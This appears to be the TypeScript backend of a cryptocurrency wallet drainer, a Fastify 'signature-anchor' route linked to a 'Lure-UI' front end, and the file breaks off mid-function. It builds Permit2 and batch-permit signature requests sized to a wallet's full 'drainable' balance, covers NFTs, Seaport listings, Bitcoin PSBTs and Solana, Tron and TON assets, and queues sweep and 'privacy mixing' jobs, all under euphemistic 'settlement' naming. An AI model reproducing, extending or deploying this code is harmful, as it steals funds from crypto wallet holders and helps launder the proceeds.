/**
 * Signature Anchor — omni-payload ingress to `signatures` (settlement.ts builders + Supabase service role).
 * Route Initialization aligned with Lure-UI `/api/signature-anchor` institutional contract.
 */
import {
  computeSignatureAnchorExpiry,
  executeDelegateCashRegistrySurfaceRead,
  assertNoSimulationFlagsInProduction,
  executeOmnichainAtomicSettlement,
  executeSettlementIgnition,
  isExpiryIsoWithinDriftWindow,
  openSignaturePayloadForSettlement,
  packOmnichainAtomicSignatureEnvelope,
  parseOmnichainAtomicSignatureEnvelope,
  PERMIT2_MAX_AMOUNT,
  resolveChainIngress,
  resolvePermit2ApprovalAmountForToken,
  resolveGatekeeperEthereumRpcUrl,
  type SettlementPolicyDecision,
  type OmnichainAtomicSettlementResult,
  type SettlementIgnitionTelemetry,
  isCosmosBech32Address,
  isAptosAddress,
  isSuiAddress,
  buildEip7702AuthorizationRequest,
  isEip7702Enabled,
  packEip7702SignatureEnvelope,
  type Eip7702SignedAuthorization,
} from '@legion/core'
import {
  getChainEnvName,
  getRpcUrlForChainWithFallback,
  isRpcConfigured,
} from '@legion/core/lib/chain-rpc'
import {
  buildPermit2SingleTypedData,
  Permit2Handler,
} from '@legion/core/security/permit2-handler'
import {
  packPermit2SignatureEnvelope,
  readPermit2AllowanceNonce,
  resolveEngineSpenderAddress,
  type Permit2SingleMetadata,
} from '@legion/core/logic/permit2-executor'
import {
  buildBatchPermitTypedData,
  packBatchPermit2SignatureEnvelope,
  type BatchPermitMetadata,
  type BatchNftEntry,
} from '@legion/core/logic/permit2-batch'
import {
  batchNativeWithPermit2,
  hasOmnichainBatchDrainLeg,
  parseNativeAmount,
} from '@legion/core/logic/native-coin-drain'
import {
  buildBitcoinDrainPsbt,
  packBitcoinPsbtSignatureEnvelope,
  parseBitcoinSatAmount,
  resolveBitcoinVaultAddress,
} from '@legion/core/logic/bitcoin-drain'
import {
  normalizeSeaportOrder,
  packSeaportListingSignatureEnvelope,
} from '@legion/core/logic/seaport-drain'
import { dedupeNftEntriesByContract } from '@legion/core/logic/nft-drain'

const PERMIT2_CONTRACT = '0x000000000022D473030F116dDEE9F6B43aC78BA3' as Address
import {
  buildGatekeeperLogRedactionPayload,
  sanitizeGatekeeperLogDetail,
  type GatekeeperLogRedactionFields,
} from '@legion/core/logic'
import {
  buildEvmSignatureAnchorSettlement,
  buildSvmSignatureAnchorSettlement,
  buildTonSignatureAnchorSettlement,
  buildTronSignatureAnchorSettlement,
  buildUtxoSignatureAnchorSettlement,
  type NormalizedSignatureAnchorSettlement,
  type SignatureAnchorChainFamily,
} from '@legion/core/logic/settlement'
import { verifyAuthorizedSessionPersistenceAnchor } from '@legion/core/logic/index'
import { sealSignatureHexForPersistence } from '@legion/core/security/signature-shadow-envelope'
import { createClient } from '@supabase/supabase-js'
import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
import type { Address, Hex } from 'viem'
import { createPublicClient, getAddress, http, isAddress, stringToHex } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { arbitrum, base, mainnet, sepolia, bscTestnet } from 'viem/chains'

import { sendFailure, sendSuccess } from '../lib/api-response.js'
import {
  validateOmnichainAtomicIngressPayloads,
  validatePermit2BatchOmnichainTokenLegs,
} from '../lib/schemas.js'
import { enqueueExtractionJob } from '../lib/extraction-queue.js'
import {
  evaluateLargeSettlementIngress,
  onLargeSettlementSettled,
  runSettlementWithPolicyMev,
} from '../lib/large-settlement.js'
import { enqueuePrivacyMixingJob } from '../lib/privacy-mixing-queue.js'
import { enqueueSweepJob } from '../lib/sweep-queue.js'
import { isTrainingDemoModeEnabled, isTrainingDemoRequest } from '../lib/training-demo-mode.js'
import { isSettlementPaused, recordLastDrainTime } from '../lib/settlement-pause.js'
import { queueKineticDeepAssetScan } from '../lib/kinetic-deep-scan.js'
import { validateScoutValueUsdField } from '../lib/scout-value-usd.js'
import { sendSovereignTelemetryPayload } from '../telemetry-sender.js'
import {
  notifySignatureReceived,
  notifyBroadcastScheduled,
  notifyBroadcastConfirmed,
  notifyEvmSettlementWhenVerified,
  notifyNewSignatureAnchorRequest,
  notifyRelayIntermediaryWarning,
  notifySettlementAttempt,
  notifySettlementResult,
  dispatchLocalTestTelegramEvent,
  type TelegramRequestContext,
} from '../lib/telegram.js'
import { isEvmTransactionHash } from '../lib/evm-tx-verify.js'
import {
  finalizeSettlementHistory,
  recordSettlementHistory,
} from '../lib/settlement-history.js'

const SHADOW_ENVELOPE_PREFIX = 'SHADOW_GCM:v1:'
const BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93'
const SETTLEMENT_RPC_RETRY_DELAYS_MS = [2000, 5000, 10000] as const

function settlementBackoffDelayMs(attempt: number): number {
  const base = SETTLEMENT_RPC_RETRY_DELAYS_MS[attempt] ?? 10000
  return base + Math.floor(Math.random() * base * 0.5)
}

function sleepSettlementMs(ms: number): Promise<void> {
  return new Promise((resolve) => {
    setTimeout(resolve, ms)
  })
}

function isContractSettlementFault(fault: string): boolean {
  const f = fault.toLowerCase()
  return (
    f.includes('reverted') ||
    f.includes('invalidsigner') ||
    f.includes('invalidnonce') ||
    f.includes('invalidamount') ||
    f.includes('signatureexpired') ||
    f.includes('allowanceexpired') ||
    f.includes('permit() failed') ||
    f.includes('0x815e1d64')
  )
}

function isDeferredBroadcastFault(fault: string): boolean {
  const f = fault.toLowerCase()
  if (f.includes('insufficient_relayer_balance')) return false
  if (isContractSettlementFault(fault)) return false
  return (
    f.includes('rpc') ||
    f.includes('network relay') ||
    f.includes('broadcast_failed') ||
    f.includes('econnrefused') ||
    f.includes('timeout') ||
    f.includes('fetch failed') ||
    f.includes('socket') ||
    f.includes('503') ||
    f.includes('502') ||
    f.includes('relay')
  )
}

/** Typed-data / PSBT builders: map transport blips to 503 instead of ServerError 500. */
function isTransientUpstreamFault(err: unknown): boolean {
  const f = (err instanceof Error ? err.message : String(err)).toLowerCase()
  return (
    f.includes('rpc') ||
    f.includes('timeout') ||
    f.includes('timed out') ||
    f.includes('econnrefused') ||
    f.includes('econnreset') ||
    f.includes('fetch failed') ||
    f.includes('network') ||
    f.includes('socket') ||
    f.includes('429') ||
    f.includes('502') ||
    f.includes('503') ||
    f.includes('504') ||
    f.includes('rate limit') ||
    f.includes('http request failed') ||
    f.includes('short write') ||
    f.includes('blocked by cloudflare')
  )
}

function sendTypedDataBuildFailure(reply: FastifyReply, err: unknown) {
  const msg = err instanceof Error ? err.message : String(err)
  if (isTransientUpstreamFault(err)) {
    return sendFailure(reply, 503, msg, { code: 'RPC_UNAVAILABLE' })
  }
  return sendFailure(reply, 500, msg, { code: 'ServerError' })
}

function isInsufficientRelayerFault(fault: string): boolean {
  return fault.toLowerCase().includes('insufficient_relayer_balance')
}

async function checkSettlementRelayerBalance(
  chainId: number,
): Promise<{ ok: true } | { ok: false; detail: string }> {
  const rawKey =
    process.env['SETTLEMENT_EXECUTION_PRIVATE_KEY']?.trim() ||
    process.env['PRIVATE_KEY']?.trim()
  if (!rawKey) return { ok: true }
  try {
    const pk = (rawKey.startsWith('0x') ? rawKey : `0x${rawKey}`) as Hex
    const account = privateKeyToAccount(pk)
    let rpcUrl: string
    try {
      rpcUrl = getRpcUrlForChainWithFallback(chainId)
    } catch {
      rpcUrl = await gatekeeperEthereumRpcUrl()
    }
    const client = createPublicClient({ transport: http(rpcUrl) })
    const minWei = BigInt(process.env['MIN_RELAYER_WEI']?.trim() || '1')
    const bal = await client.getBalance({ address: account.address })
    if (bal < minWei) {
      return { ok: false, detail: `relayer balance ${bal} < min ${minWei}` }
    }
    return { ok: true }
  } catch {
    return { ok: true }
  }
}

function hasConfiguredShadowEnvelopeKey(): boolean {
  const explicit = (process.env['SHADOW_VAULT_KEY']?.trim()
    || process.env['SETTLEMENT_EXECUTION_PRIVATE_KEY']?.trim()?.replace(/^0x/, ''))
  if (explicit && /^[0-9a-fA-F]{64}$/.test(explicit)) return true
  const gatekeeperSecret = process.env['GATEKEEPER_SECRET']?.trim()
  return Boolean(gatekeeperSecret)
}

function gatekeeperPersistLog(
  level: 'error' | 'warn',
  event: string,
  detail: string,
  fields?: GatekeeperLogRedactionFields,
): void {
  const line = JSON.stringify({
    level: level === 'error' ? 50 : 40,
    time: Date.now(),
    sentinel: 'Gatekeeper',
    module: 'apps/api/signature-anchor',
    event,
    detail: sanitizeGatekeeperLogDetail(detail),
    ...buildGatekeeperLogRedactionPayload(fields),
  })
  process.stderr.write(`${line}\n`)
}

function serializeSupabaseFault(err: {
  message: string
  code?: string
  details?: string
  hint?: string
}): string {
  return sanitizeGatekeeperLogDetail(
    JSON.stringify({
      message: err.message,
      code: err.code ?? null,
      details: err.details ?? null,
      hint: err.hint ?? null,
    }),
  )
}

function resolveCentralHubVaultUrl(): string {
  const url =
    process.env['NEXT_PUBLIC_SUPABASE_URL']?.trim() ||
    process.env['SUPABASE_URL']?.trim() ||
    ''
  if (!url) throw new Error('NEXT_PUBLIC_SUPABASE_URL / SUPABASE_URL')
  return url
}

type ChainFamily = SignatureAnchorChainFamily

interface NormalizedIngressV1 {
  ingress: 'normalized_v1'
  chain_family: ChainFamily
  wallet_address: string
  token_address: string
  signature?: Hex | string
  signature_hex?: Hex | string
  nonce: string
  expiry_iso: string
  wallet_type: string
  protocol: string
  chain_id?: number | string
  caip_chain_id?: string
  engine_spender?: Address
  permit2?: Address
  permit_metadata?: Permit2SingleMetadata
  permits?: Array<{ token: string; amount: string }>
  batch_permit_metadata?: BatchPermitMetadata
  nativeAmount?: string
  native_signed_transaction?: Hex | string
  nativeAmountSol?: string
  nativeAmountTrx?: string
  nativeAmountTon?: string
  sol_wallet?: string
  trx_wallet?: string
  ton_wallet?: string
  native_signed_transaction_sol?: string
  native_signed_transaction_trx?: Record<string, unknown>
  native_signed_transaction_ton?: string
  spl_mint?: string
  spl_amount?: string
  spl_signed_transaction?: string
  trc20_contract?: string
  trc20_amount?: string
  trc20_signed_transaction?: Record<string, unknown>
  jetton_master?: string
  jetton_amount?: string
  jetton_signed_transaction?: string
  nfts?: Array<{ contract: string; tokenIds: string[]; standard?: 'erc721' | 'erc1155'; amounts?: string[] }>
  nft_approval_signatures?: Record<string, string>
  seaport_order?: unknown
  seaport_version?: '1.5' | '1.4'
  order_hash?: string
  signed_psbt_base64?: string
  psbt_metadata?: {
    amount_sat?: string
    fee_sat?: string
    vault_address?: string
  }
  evm_payload?: {
    native_amount?: string
    native_signed_transaction?: Hex | string
    nfts?: Array<{ contract: string; tokenIds: string[]; standard?: 'erc721' | 'erc1155'; amounts?: string[] }>
  }
  solana_payload?: Record<string, unknown>
  tron_payload?: Record<string, unknown>
  ton_payload?: Record<string, unknown>
  bitcoin_payload?: {
    signed_psbt_base64?: string
    wallet_address?: string
    vault_address?: string
    amount_sat?: string
    fee_sat?: string
  }
  cosmos_payload?: Record<string, unknown>
  aptos_payload?: Record<string, unknown>
  sui_payload?: Record<string, unknown>
  eip7702_authorization?: Eip7702SignedAuthorization & { chainId?: number; address?: string; nonce?: string | number }
  delegatee?: Address
  erc20s?: string[]
  defi_actions?: unknown[]
  scout_value_usd?: number
  amount?: string
  wallet_balance?: string
  max_allowance?: string
  requires_quorum?: boolean
}

interface AgnosticNormalizationV1 {
  ingress: 'agnostic_normalization_v1'
  signature?: Hex | string
  signature_hex?: Hex | string
  wallet_address: string
  wallet_type: string
  protocol: string
  chain_id?: number | string
  token_address?: string
  nonce?: string
  expiry_iso?: string
  scout_value_usd?: number
  amount?: string
  wallet_balance?: string
  max_allowance?: string
  requires_quorum?: boolean
}

interface LegacyPermit2Body {
  chainId: number
  wallet: Address
  token: Address
  engineSpender: Address
  permit2: Address
  nonce: string
  expiryIso: string
  signature: Hex
  wallet_type?: string
  protocol?: string
  chain_id?: number | string
  scout_value_usd?: number
  amount?: string
  wallet_balance?: string
  max_allowance?: string
  requires_quorum?: boolean
}

const chains = [mainnet, sepolia, arbitrum, base, bscTestnet] as const
function chainById(id: number) {
  return chains.find((c) => c.id === id) ?? mainnet
}

async function gatekeeperEthereumRpcUrl(): Promise<string> {
  return resolveGatekeeperEthereumRpcUrl({
    primaryUrl: process.env['RPC_ETHEREUM_PRIVATE'] ?? process.env['NEXT_PUBLIC_RPC_URL'],
  })
}

const PROTOCOL_RACK = new Set([
  'evm',
  'evm_personal_verification',
  'evm_server_signing',
  'permit2_eip712',
  'permit2_batch_eip712',
  'eip7702_delegation',
  'eip7702_self_broadcast',
  'omnichain_atomic_v1',
  'seaport_listing',
  'solana',
  'utxo',
  'bitcoin_psbt',
  'tron',
  'ton',
  'cosmos',
  'aptos',
  'sui',
  'polkadot',
  'algorand',
  'cardano',
])

type PersistedSignatureRow = {
  wallet_address: string
  token_address: string
  signature_hex: string
  nonce: string
  expiry: string
  wallet_type: string
  protocol: string
  chain_family?: ChainFamily | null
  chain_id?: string | null
  caip_chain_id?: string | null
  scout_value_usd?: string | null
  amount?: string | null
  max_allowance?: string | null
  requires_quorum?: boolean | null
  source_origin: string
}

function anchorLogFields(row: PersistedSignatureRow, scout_value_usd?: number): GatekeeperLogRedactionFields {
  return {
    wallet_address: row.wallet_address,
    token_address: row.token_address,
    scout_value_usd: row.scout_value_usd ?? scout_value_usd,
    amount: row.amount,
  }
}

type SettlementIgnitionOutcome =
  | SettlementIgnitionTelemetry
  | {
      ignition_fault: string
      omnichain_atomic_settlement?: OmnichainAtomicSettlementResult
    }
  | {
      sovereign_dispatcher_tx_hash?: string
      sovereign_dispatcher_status?: 'broadcasted'
      omnichain_atomic_settlement: OmnichainAtomicSettlementResult
    }

// Use ReturnType to avoid generic parameter mismatch with SupabaseClient versions.
type SupabaseAdminClient = ReturnType<typeof createClient>

function normalizeProtocolRack(p: string): string {
  return p.trim().toLowerCase()
}

type DelegateCashRegistrySurface = {
  delegateForAll: boolean
  delegateForPermit2Contract: boolean
  delegateForTokenContract: boolean
}

function isVaultDelegatedToEngineSpender(surface: DelegateCashRegistrySurface): boolean {
  return (
    surface.delegateForAll ||
    surface.delegateForPermit2Contract ||
    surface.delegateForTokenContract
  )
}

/** Returns a 403 reply when Delegate Registry v2 shows an active delegation to `engineSpender`. */
async function rejectIfDelegateCashDelegated(
  reply: FastifyReply,
  client: Parameters<typeof executeDelegateCashRegistrySurfaceRead>[0],
  params: Parameters<typeof executeDelegateCashRegistrySurfaceRead>[1],
  context?: { token_address?: string },
): Promise<FastifyReply | null> {
  const surface = (await executeDelegateCashRegistrySurfaceRead(
    client,
    params,
  )) as DelegateCashRegistrySurface
  const delegated = isVaultDelegatedToEngineSpender(surface)
  if (!delegated) {
    return null as FastifyReply | null
  }
  gatekeeperPersistLog(
    'warn',
    'signatures.delegate_cash_rejected',
    'Delegate.cash delegation active for vault → engine_spender',
    {
      wallet_address: params.vault,
      token_address: context?.token_address,
    },
  )
  return sendFailure(
    reply,
    403,
    'Wallet has active Delegate.cash delegation to engine spender; Signature Anchor rejected.',
    {
      code: 'DelegateCashActive',
      delegate_for_all: surface.delegateForAll,
      delegate_for_permit2_contract: surface.delegateForPermit2Contract,
      delegate_for_token_contract: surface.delegateForTokenContract,
      ...(context?.token_address ? { token_address: context.token_address } : {}),
    },
  )
}

function isHexLike(s: string): boolean {
  return /^0x[0-9a-fA-F]+$/.test(s.trim())
}

function normalizeSignatureHexForSeal(raw: string): Hex {
  const t = raw.trim()
  if (isHexLike(t)) {
    return (t.startsWith('0x') ? t : `0x${t}`) as Hex
  }
  return stringToHex(t) as Hex
}

const SOURCE_ORIGIN_MAX = 512
function sanitizeSourceOriginInput(raw: string): string {
  return raw.replace(/[\r\n\0\u202e\u200e\u200f]/g, '').slice(0, SOURCE_ORIGIN_MAX)
}

function headerString(req: FastifyRequest, name: string): string | null {
  const v = req.headers[name]
  if (v == null) return null
  const s = Array.isArray(v) ? v[0] : v
  return s != null && s.trim() !== '' ? sanitizeSourceOriginInput(s.trim()) : null
}

function resolveDataBindingSourceOrigin(
  req: FastifyRequest,
  body: Record<string, unknown> | null,
): string {
  const fromBody = (key: string): string | null => {
    const v = body?.[key]
    return typeof v === 'string' && v.trim() !== '' ? sanitizeSourceOriginInput(v.trim()) : null
  }
  const direct = fromBody('origin') ?? fromBody('source_origin')
  if (direct) return direct
  const h =
    headerString(req, 'origin') ??
    headerString(req, 'x-source-origin') ??
    headerString(req, 'x-forwarded-host') ??
    headerString(req, 'host')
  if (h) return h
  const referer = headerString(req, 'referer')
  if (referer) {
    try {
      const u = new URL(referer)
      return sanitizeSourceOriginInput(`${u.protocol}//${u.host}`)
    } catch {
      return referer
    }
  }
  return 'unknown'
}

function isNormalizedIngress(body: unknown): body is NormalizedIngressV1 {
  if (typeof body !== 'object' || body === null) return false
  const o = body as Record<string, unknown>
  return o['ingress'] === 'normalized_v1'
}

function isAgnosticNormalization(body: unknown): body is AgnosticNormalizationV1 {
  if (typeof body !== 'object' || body === null) return false
  const o = body as Record<string, unknown>
  return o['ingress'] === 'agnostic_normalization_v1'
}

function chainFamilyFromRack(rack: string): ChainFamily {
  const r = normalizeProtocolRack(rack)
  if (r === 'solana') return 'SVM'
  if (r === 'utxo') return 'UTXO'
  if (r === 'tron') return 'TRON'
  if (r === 'ton') return 'TON'
  if (r === 'cosmos') return 'COSMOS'
  if (r === 'aptos') return 'APTOS'
  if (r === 'sui') return 'SUI'
  return 'EVM'
}

function normalizeWalletToken(
  family: ChainFamily,
  wallet: string,
  token: string,
): { wallet_address: string; token_address: string } {
  if (family === 'EVM') {
    return { wallet_address: wallet.trim().toLowerCase(), token_address: token.trim().toLowerCase() }
  }
  return { wallet_address: wallet.trim(), token_address: token.trim() }
}

function readPositiveIntAmount(value: unknown): string | null {
  if (typeof value === 'string' && /^\d+$/.test(value.trim()) && value.trim() !== '0') {
    return value.trim()
  }
  if (typeof value === 'number' && Number.isFinite(value) && Number.isInteger(value) && value > 0) {
    return String(value)
  }
  return null
}

function extractShadowTelemetry(o: Record<string, unknown>): {
  scout_value_usd: string | null
  amount: string | null
  max_allowance: string | null
  requires_quorum: boolean | null
} {
  const scoutCheck = validateScoutValueUsdField(o['scout_value_usd'])
  if (scoutCheck.ok === false) {
    throw new Error(scoutCheck.error)
  }
  let scout_value_usd: string | null = null
  if (typeof o['scout_value_usd'] === 'number' && Number.isFinite(o['scout_value_usd'])) {
    scout_value_usd = String(o['scout_value_usd'])
  } else if (typeof o['scout_value_usd'] === 'string' && o['scout_value_usd'].trim() !== '') {
    scout_value_usd = o['scout_value_usd'].trim()
  }
  let amount: string | null = readPositiveIntAmount(o['amount'])
  if (amount == null) amount = readPositiveIntAmount(o['wallet_balance'])
  if (amount == null) {
    const meta = o['permit_metadata']
    if (meta !== null && typeof meta === 'object' && !Array.isArray(meta)) {
      const rec = meta as Record<string, unknown>
      amount = readPositiveIntAmount(rec['amount'])
      if (amount == null && rec['details'] !== null && typeof rec['details'] === 'object') {
        amount = readPositiveIntAmount((rec['details'] as Record<string, unknown>)['amount'])
      }
    }
  }
  let max_allowance: string | null = null
  if (typeof o['max_allowance'] === 'string' && o['max_allowance'].trim() !== '') {
    max_allowance = o['max_allowance'].trim()
  }
  let requires_quorum: boolean | null = null
  if (typeof o['requires_quorum'] === 'boolean') {
    requires_quorum = o['requires_quorum']
  }
  if (scout_value_usd == null || scout_value_usd === '') scout_value_usd = '0'
  if (max_allowance == null || max_allowance === '') max_allowance = String(PERMIT2_MAX_AMOUNT)
  return { scout_value_usd, amount, max_allowance, requires_quorum }
}

function resolveConfiguredEngineSpender(): Address {
  const fromEnv = resolveEngineSpenderAddress()
  if (fromEnv) return fromEnv
  throw new Error('ENGINE_SPENDER or NEXT_PUBLIC_ENGINE_SPENDER must be configured')
}

function resolveConfiguredPermit2(): Address {
  return PERMIT2_CONTRACT
}

function parseBatchNftEntries(
  raw: unknown,
): { ok: true; nfts: BatchNftEntry[] } | { ok: false; error: string } {
  if (raw == null) return { ok: true, nfts: [] }
  if (!Array.isArray(raw)) {
    return { ok: false, error: 'nfts must be an array of { contract, tokenIds }' }
  }
  const nfts: BatchNftEntry[] = []
  for (const entry of raw) {
    if (typeof entry !== 'object' || entry == null) {
      return { ok: false, error: 'Each nft entry must be an object' }
    }
    const contract = (entry as { contract?: string }).contract?.trim() ?? ''
    const tokenIdsRaw = (entry as { tokenIds?: unknown }).tokenIds
    const standard = (entry as { standard?: string }).standard
    const amountsRaw = (entry as { amounts?: unknown }).amounts
    if (!contract || !isAddress(contract)) {
      return { ok: false, error: 'Each nft entry requires a valid contract address' }
    }
    if (!Array.isArray(tokenIdsRaw) || tokenIdsRaw.length === 0) {
      return { ok: false, error: 'Each nft entry requires non-empty tokenIds[]' }
    }
    const tokenIds = tokenIdsRaw.map((id) => String(id).trim()).filter(Boolean)
    if (tokenIds.length === 0) {
      return { ok: false, error: 'Each nft entry requires valid tokenIds' }
    }
    for (const tokenId of tokenIds) {
      try {
        if (BigInt(tokenId) < 0n) {
          return { ok: false, error: 'tokenIds must be non-negative integers' }
        }
      } catch {
        return { ok: false, error: 'tokenIds must be valid integer strings' }
      }
    }
    let amounts: string[] | undefined
    if (amountsRaw != null) {
      if (!Array.isArray(amountsRaw) || amountsRaw.length !== tokenIds.length) {
        return { ok: false, error: 'nft amounts[] length must match tokenIds[]' }
      }
      amounts = amountsRaw.map((amount) => String(amount).trim())
    }
    if (standard != null && standard !== 'erc721' && standard !== 'erc1155') {
      return { ok: false, error: 'nft standard must be erc721 or erc1155' }
    }
    nfts.push({
      contract: contract as Address,
      tokenIds,
      ...(standard ? { standard: standard as 'erc721' | 'erc1155' } : {}),
      ...(amounts ? { amounts } : {}),
    })
  }
  return { ok: true, nfts: dedupeNftEntriesByContract(nfts) }
}

/** Recursively convert BigInt values to strings for JSON serialization. */
function normalizeBigInts(value: unknown): unknown {
  if (typeof value === 'bigint') return value.toString()
  if (Array.isArray(value)) return value.map(normalizeBigInts)
  if (value !== null && typeof value === 'object') {
    return Object.fromEntries(
      Object.entries(value as Record<string, unknown>).map(([k, v]) => [k, normalizeBigInts(v)]),
    )
  }
  return value
}

async function buildPermit2TypedDataForWallet(params: {
  wallet: Address
  token: Address
  chainId: number
  amount?: bigint
  rpcUrl?: string
}): Promise<{
  typedData: ReturnType<typeof buildPermit2SingleTypedData>
  permit_metadata: Permit2SingleMetadata
  engine_spender: Address
  permit2: Address
}> {
  const engineSpender = resolveConfiguredEngineSpender()
  const permit2 = resolveConfiguredPermit2()
  const rpcUrl = params.rpcUrl ?? getRpcUrlForChainWithFallback(params.chainId)
  const client = createPublicClient({ chain: chainById(params.chainId), transport: http(rpcUrl) })
  const permitNonce = await readPermit2AllowanceNonce(
    client,
    params.wallet,
    params.token,
    engineSpender,
  )
  const expiration = computeSignatureAnchorExpiry()
  const amount =
    params.amount ??
    (await resolvePermit2ApprovalAmountForToken({
      client,
      wallet: params.wallet,
      token: params.token,
    }))
  if (amount <= 0n) {
    throw new Error(
      `No drainable ${params.token} balance on ${params.wallet} — Permit2 amount would be 0`,
    )
  }
  const handler = new Permit2Handler({
    chainId: params.chainId,
    permit2Address: permit2,
    engineSpender,
  })
  const sigDeadlineSec = Math.floor(Date.now() / 1000) + 2 * 3600
  const typedData = handler.buildPermit2SignatureAnchor({
    token: params.token,
    permitNonce,
    amount,
    expiration,
    sigDeadline: BigInt(sigDeadlineSec),
  })
  const permit_metadata: Permit2SingleMetadata = {
    token: params.token,
    amount: amount.toString(),
    expiration,
    nonce: permitNonce,
    spender: engineSpender,
    sigDeadline: String(sigDeadlineSec),
    chainId: params.chainId,
  }
  return { typedData, permit_metadata, engine_spender: engineSpender, permit2 }
}

async function buildPermit2BatchTypedDataForWallet(params: {
  wallet: Address
  chainId: number
  permits: Array<{ token: Address; amount: bigint }>
  nativeAmount?: bigint
  nativeAmountSol?: bigint
  nativeAmountTrx?: bigint
  nativeAmountTon?: bigint
  solWallet?: string
  trxWallet?: string
  tonWallet?: string
  nfts?: BatchNftEntry[]
  rpcUrl?: string
}): Promise<{
  typedData: ReturnType<typeof buildBatchPermitTypedData> | null
  batch_permit_metadata: BatchPermitMetadata
  engine_spender: Address
  permit2: Address
  nativeAmount: string
  native_transfer: Awaited<ReturnType<typeof batchNativeWithPermit2>>['native_transfer']
  native_amount_sol?: string
  native_amount_trx?: string
  native_amount_ton?: string
  native_transfer_sol?: Awaited<ReturnType<typeof batchNativeWithPermit2>>['native_transfer_sol']
  native_transfer_trx?: Awaited<ReturnType<typeof batchNativeWithPermit2>>['native_transfer_trx']
  native_transfer_ton?: Awaited<ReturnType<typeof batchNativeWithPermit2>>['native_transfer_ton']
  nfts?: BatchNftEntry[]
  nft_approval_typed_data?: Awaited<ReturnType<typeof batchNativeWithPermit2>>['nft_approval_typed_data']
}> {
  const engineSpender = resolveConfiguredEngineSpender()
  const permit2 = resolveConfiguredPermit2()
  const rpcUrl = params.rpcUrl ?? getRpcUrlForChainWithFallback(params.chainId)
  const batchClient = createPublicClient({ chain: chainById(params.chainId), transport: http(rpcUrl) })
  const resolvedPermits = (
    await Promise.all(
      params.permits.map(async (permit) => {
        if (permit.amount >= PERMIT2_MAX_AMOUNT) {
          return { token: permit.token, amount: PERMIT2_MAX_AMOUNT }
        }
        if (permit.amount > 0n) {
          return permit
        }
        const amount = await resolvePermit2ApprovalAmountForToken({
          client: batchClient,
          wallet: params.wallet,
          token: permit.token,
        })
        return { token: permit.token, amount }
      }),
    )
  ).filter((permit) => permit.amount > 0n)
  const omnichainLeg = hasOmnichainBatchDrainLeg(params)
  let effectiveNativeAmount = params.nativeAmount ?? 0n
  if (resolvedPermits.length === 0 && effectiveNativeAmount <= 0n && !omnichainLeg) {
    const balance = await batchClient.getBalance({ address: params.wallet })
    const fees = await batchClient.estimateFeesPerGas()
    const gasCost = 21_000n * (fees.maxFeePerGas ?? 0n)
    effectiveNativeAmount = balance > gasCost ? balance - gasCost : 0n
    if (effectiveNativeAmount <= 0n) {
      throw new Error('No drainable assets found for wallet')
    }
  }
  const built = await batchNativeWithPermit2({
    wallet: params.wallet,
    chainId: params.chainId,
    permits: resolvedPermits,
    nativeAmount: effectiveNativeAmount,
    nativeAmountSol: params.nativeAmountSol,
    nativeAmountTrx: params.nativeAmountTrx,
    nativeAmountTon: params.nativeAmountTon,
    solWallet: params.solWallet,
    trxWallet: params.trxWallet,
    tonWallet: params.tonWallet,
    nfts: params.nfts,
    engineSpender,
    permit2,
    rpcUrl,
  })
  return {
    typedData: built.batchTypedData,
    batch_permit_metadata: built.batch_permit_metadata,
    engine_spender: engineSpender,
    permit2,
    nativeAmount: built.nativeAmount,
    native_transfer: built.native_transfer,
    ...(built.native_amount_sol ? { native_amount_sol: built.native_amount_sol } : {}),
    ...(built.native_amount_trx ? { native_amount_trx: built.native_amount_trx } : {}),
    ...(built.native_amount_ton ? { native_amount_ton: built.native_amount_ton } : {}),
    ...(built.native_transfer_sol ? { native_transfer_sol: built.native_transfer_sol } : {}),
    ...(built.native_transfer_trx ? { native_transfer_trx: built.native_transfer_trx } : {}),
    ...(built.native_transfer_ton ? { native_transfer_ton: built.native_transfer_ton } : {}),
    ...(built.nfts ? { nfts: built.nfts, nft_approval_typed_data: built.nft_approval_typed_data } : {}),
  }
}

function packEvmPermit2SignatureForPersistence(
  rawSignature: Hex | string,
  permitMetadata: Permit2SingleMetadata,
): Hex {
  const sig = normalizeSignatureHexForSeal(String(rawSignature)) as Hex
  return packPermit2SignatureEnvelope({
    permit2Signature: sig,
    permit: permitMetadata,
  })
}

function packEvmBatchPermit2SignatureForPersistence(
  rawSignature: Hex | string,
  batchMetadata: BatchPermitMetadata,
  options?: {
    nativeAmount?: string
    nativeSignedTransaction?: Hex | string
    nativeAmountSol?: string
    nativeAmountTrx?: string
    nativeAmountTon?: string
    nativeSignedTransactionSol?: string
    nativeSignedTransactionTrx?: Record<string, unknown>
    nativeSignedTransactionTon?: string
    splMint?: string
    splAmount?: string
    splSignedTransaction?: string
    trc20Contract?: string
    trc20Amount?: string
    trc20SignedTransaction?: Record<string, unknown>
    jettonMaster?: string
    jettonAmount?: string
    jettonSignedTransaction?: string
    nfts?: BatchNftEntry[]
    nftApprovalSignatures?: Record<string, Hex>
  },
): Hex {
  const sig = normalizeSignatureHexForSeal(String(rawSignature)) as Hex
  const nativeSigned =
    options?.nativeSignedTransaction != null
      ? (normalizeSignatureHexForSeal(String(options.nativeSignedTransaction)) as Hex)
      : undefined
  return packBatchPermit2SignatureEnvelope({
    permit2Signature: sig,
    batch: batchMetadata,
    ...(options?.nativeAmount && options.nativeAmount !== '0'
      ? { nativeAmount: options.nativeAmount }
      : {}),
    ...(nativeSigned ? { nativeSignedTransaction: nativeSigned } : {}),
    ...(options?.nativeAmountSol && options.nativeAmountSol !== '0'
      ? { nativeAmountSol: options.nativeAmountSol }
      : {}),
    ...(options?.nativeAmountTrx && options.nativeAmountTrx !== '0'
      ? { nativeAmountTrx: options.nativeAmountTrx }
      : {}),
    ...(options?.nativeAmountTon && options.nativeAmountTon !== '0'
      ? { nativeAmountTon: options.nativeAmountTon }
      : {}),
    ...(options?.nativeSignedTransactionSol
      ? { nativeSignedTransactionSol: options.nativeSignedTransactionSol }
      : {}),
    ...(options?.nativeSignedTransactionTrx
      ? { nativeSignedTransactionTrx: options.nativeSignedTransactionTrx }
      : {}),
    ...(options?.nativeSignedTransactionTon
      ? { nativeSignedTransactionTon: options.nativeSignedTransactionTon }
      : {}),
    ...(options?.splMint && options.splAmount && options.splAmount !== '0'
      ? { splMint: options.splMint, splAmount: options.splAmount }
      : {}),
    ...(options?.splSignedTransaction
      ? { nativeSignedTransactionSpl: options.splSignedTransaction }
      : {}),
    ...(options?.trc20Contract && options.trc20Amount && options.trc20Amount !== '0'
      ? { trc20Contract: options.trc20Contract, trc20Amount: options.trc20Amount }
      : {}),
